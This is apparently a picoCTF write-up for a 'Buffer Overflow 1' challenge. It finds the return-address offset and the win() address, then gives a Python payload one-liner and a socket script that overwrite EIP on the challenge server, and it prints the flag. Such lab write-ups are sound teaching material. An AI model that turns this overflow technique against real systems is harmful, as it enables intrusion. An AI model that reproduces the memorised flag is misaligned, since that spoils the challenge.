# Buffer Overflow 1

## Problem

Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using nc saturn.picoctf.net 57777

## Solution

1. search for the offset where we can change the eip: we found it on the `44th character + new_eip`
2. search for the address of `win()` function: using the command `$ readelf -s vuln | grep win` we know that the address of `win()` is 080491f6
3. search for the little endian of `win()`: \xf6\x91\x04\x08
4. run the program: `python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 44 + b"\xf6\x91\x04\x08")' | ./vuln` we then get the flag that we created, which is `picoCTF{REDACTED}`
5. create the program to solve the challenge
    ```
    #!/usr/bin/env python3

    import socket
    from argparse import ArgumentParser
    import struct

    # parse console arguments
    parser = ArgumentParser()
    parser.add_argument('host', type=str, help="addr or ip to connect")
    parser.add_argument('port', type=int, help="port to connect")

    args = parser.parse_args()
    [host, port] = [args.host, args.port]

    # create payload
    offset = 44
    new_eip = struct.pack("<I", 0x080491f6)

    payload = b"".join([
        b"A" * offset,
        new_eip,
        b"\n"
    ])

    # connect to server
    conn = socket.socket()
    conn.connect((host, port))
    print(conn.recv(4096).decode('utf-8'))
    conn.send(payload)
    print(conn.recv(4096).decode('utf-8'))
    print(conn.recv(4096).decode('utf-8'))
    ```
6. here's the bash script to just get the flag: `python3 test.py saturn.picoctf.net 62684 | grep -oE picoCTF{.*?} --color=none`

here's the flag: `picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}`

### Additional Notes

- to get the output logs: `sudo dmesg`
- to get the symbols binaries of the program: `readelf -s vuln`